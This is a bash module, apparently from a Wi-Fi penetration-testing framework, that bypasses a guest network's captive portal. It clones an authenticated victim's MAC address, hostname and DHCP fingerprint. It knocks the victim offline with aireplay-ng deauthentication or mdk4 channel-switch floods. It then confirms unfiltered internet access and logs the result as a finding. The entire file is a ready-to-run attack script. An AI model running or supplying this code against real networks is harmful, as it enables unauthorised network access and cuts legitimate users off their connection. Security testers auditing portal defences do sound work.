#!/usr/bin/env bash
# MODULE_META
# NAME="Captive Portal Bypass"
# CATEGORY="F"
# DEPS="A4"
# CRITICAL="no"
# TOOLS="macchanger,curl,aireplay-ng,mdk4"
# DESC="Bypass captive portal via MAC spoofing of authenticated clients"
# REQS="managed_iface,target_ssid"
# PCAP="no"
# TIMED="yes"
# PROMPTS="target_client,pmf_guard"
# DECODE="none"

#===============================================================================
#  modules/f4_portal_bypass.sh
#  F4: Captive Portal Bypass (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Identify authenticated MACs from A4 Client Fingerprinting.
#  2. Use TARGET_CLIENT provided by Go brain.
#  3. Deauthenticate/Suppress the victim to prevent ACK storms/collisions.
#  4. Spoof local identity (MAC + Hostname + DHCP Fingerprint).
#===============================================================================

set -euo pipefail

# Intelligence Insight (Colors)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
MONITOR_IFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
TARGET_BSSID="${GUEST_BSSID:-}"
SCAN_TIME="${SCAN_TIME:-15}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="F4"
TARGET_CLIENT="${TARGET_CLIENT:-}"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

if [[ -z "$TARGET_CLIENT" ]]; then
    echo "[!] No target client specified. Identity spoofing requires a victim MAC."
    exit 0
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting identity spoofing bypass for: ${C_VAR}$TARGET_CLIENT${C_RESET}"

# 1. Roaming / Suppression
# Suppression (beacon flood / deauth) requires the monitor-mode interface for frame injection.
SUPPRESS_PID=""
if [[ -n "$TARGET_BSSID" ]] && [[ -n "$MONITOR_IFACE" ]]; then
    if command -v mdk4 &>/dev/null; then
        echo -e "[*] Starting ${C_BOLD}PMF-resilient suppression (mdk4 CSA)${C_RESET} on $MONITOR_IFACE..."
        # mdk4 b -c: Force clients to roam to a non-existent channel (14)
        mdk4 "$MONITOR_IFACE" b -n "$SSID" -c 14 > /dev/null 2>&1 &
        SUPPRESS_PID=$!
    else
        echo -e "[*] Starting legacy deauth suppression on $MONITOR_IFACE..."
        aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$TARGET_CLIENT" "$MONITOR_IFACE" > /dev/null 2>&1 &
        SUPPRESS_PID=$!
    fi
elif [[ -n "$TARGET_BSSID" ]] && [[ -z "$MONITOR_IFACE" ]]; then
    echo "[!] MONITOR_INTERFACE not set — skipping victim suppression (collision risk)."
fi

# 2. Spoofing Execution
echo -e "[*] Executing Full Identity Spoofing for ${C_VAR}$TARGET_CLIENT${C_RESET}..."
ip link set "$INTERFACE" down
macchanger -m "$TARGET_CLIENT" "$INTERFACE"

OLD_HOSTNAME=$(hostname)
SPOOFED_HOSTNAME="iPad-of-$(echo "$TARGET_CLIENT" | cut -d: -f5,6 | tr -d ':')"
echo -e "[*] Temporarily spoofing hostname to ${C_VAR}$SPOOFED_HOSTNAME${C_RESET}..."
hostname "$SPOOFED_HOSTNAME"
cleanup_f4() {
    hostname "$OLD_HOSTNAME" 2>/dev/null || true
    [[ -n "${SUPPRESS_PID:-}" ]] && kill "$SUPPRESS_PID" 2>/dev/null || true
}
trap cleanup_f4 EXIT

ip link set "$INTERFACE" up

DHCP_CONF="${EVIDENCE_DIR}/f4_dhclient.conf"
cat <<EOF > "$DHCP_CONF"
send host-name "$SPOOFED_HOSTNAME";
request subnet-mask, broadcast-address, time-offset, routers,
        domain-name, domain-name-servers, domain-search, host-name,
        netbios-name-servers, netbios-scope, interface-mtu,
        rfc3442-classless-static-routes, ntp-servers;
EOF

echo -e "[*] Requesting DHCP lease with custom Fingerprint (Option 55) (${SCAN_TIME}s)..."

# Start dynamic telemetry heartbeat
(
    HEARTBEAT_ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
        PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
        [[ $PCT -gt 90 ]] && PCT=90
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing attack..."
        sleep 2
        HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
    done
) &
TELEMETRY_PID=$!

if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    timeout "$SCAN_TIME" dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true
else
    timeout "$SCAN_TIME" dhclient -cf "$DHCP_CONF" "$INTERFACE" >/dev/null 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID || true
fi

kill "$TELEMETRY_PID" 2>/dev/null || true

# 3. Verification
# Use the Google generate_204 endpoint: returns HTTP 204 when there is NO captive portal.
# A captive portal returns 302 redirect or 200 with portal HTML — both indicate still trapped.
echo -e "[*] Verifying internet access (captive portal check)..."
BYPASS_LOG="${EVIDENCE_DIR}/${TC_ID}_bypass.log"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 http://connectivitycheck.gstatic.com/generate_204 2>/dev/null || echo "000")
echo "HTTP response code from connectivitycheck: ${HTTP_CODE}" >> "$BYPASS_LOG"
if [[ "$HTTP_CODE" == "204" ]]; then
    echo -e "[!] ${C_BOLD}SUCCESS: CAPTIVE PORTAL BYPASSED! (HTTP 204 — unfiltered internet)${C_RESET}" | tee -a "$BYPASS_LOG"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "Captive Portal Bypass Successful" \
        --severity CRITICAL \
        --desc "Successfully bypassed captive portal for SSID $SSID by spoofing authenticated MAC $TARGET_CLIENT. Received HTTP 204 (unfiltered connectivity) from the portal check endpoint." \
        --target "$SSID" \
        --evidence "$BYPASS_LOG" \
        --rationale "Identity cloning allows unauthorized access to restricted guest segments. A 204 response confirms the captive portal is no longer intercepting traffic."
else
    echo -e "[+] Mission complete. Unrestricted access not achieved (HTTP ${HTTP_CODE} — still redirected)."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[F4] Audit Complete" \
        --severity INFO \
        --desc "MAC cloning and DHCP fingerprint spoofing attempted for $TARGET_CLIENT on SSID $SSID. Portal check returned HTTP ${HTTP_CODE} — bypass was not successful." \
        --target "$SSID" \
        --evidence "$BYPASS_LOG" \
        --rationale "Captive portals with session tracking or 802.1X post-authentication may resist simple MAC cloning. NAC solutions check user-agent and DHCP fingerprint in addition to MAC."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"

# Hold window if in tactical mode so user can see final output/errors
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    echo -e "\n${ASTRA_COLOR_BOLD:-}[*] Mission Complete. Window will close in 5s...${ASTRA_COLOR_RESET:-}"
    sleep 5
fi

exit 0
